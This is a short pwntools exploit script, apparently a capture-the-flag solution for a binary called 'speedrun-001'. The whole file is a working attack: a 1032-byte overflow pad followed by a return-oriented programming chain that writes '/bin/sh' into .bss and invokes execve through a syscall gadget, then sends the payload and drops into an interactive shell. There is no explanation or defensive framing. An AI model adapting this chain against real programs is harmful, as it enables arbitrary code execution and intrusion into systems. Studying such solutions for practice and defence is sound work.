from pwn import *
from struct import *

p = "A" * 1032
p += pack('Q',0x0000000000415664) # pop rax; ret;
p += '/bin/sh\x00' # /bin/sh string
p += pack('Q',0x000000000044be16) # pop rdx; ret;
p += pack('Q',7058144) # bss
p += pack('Q',0x0000000000418397) # mov [rdx], rax; ret
p += pack('Q',0x0000000000415664) # pop rax; ret
p += pack('Q',59) # execve()
p += pack('Q',0x0000000000400686) # pop rdi; ret
p += pack('Q',7058144) # bss
p += pack('Q',0x00000000004101f3) # pop rsi; ret
p += pack('Q',0) # NULL
p += pack('Q',0x000000000044be16) # pop rdx; ret
p += pack('Q',0) # NULL
p += pack('Q',0x0000000000474e65) # syscall



r = process("./speedrun-001")
# gdb.attach(r)
r.sendline(p)
r.interactive()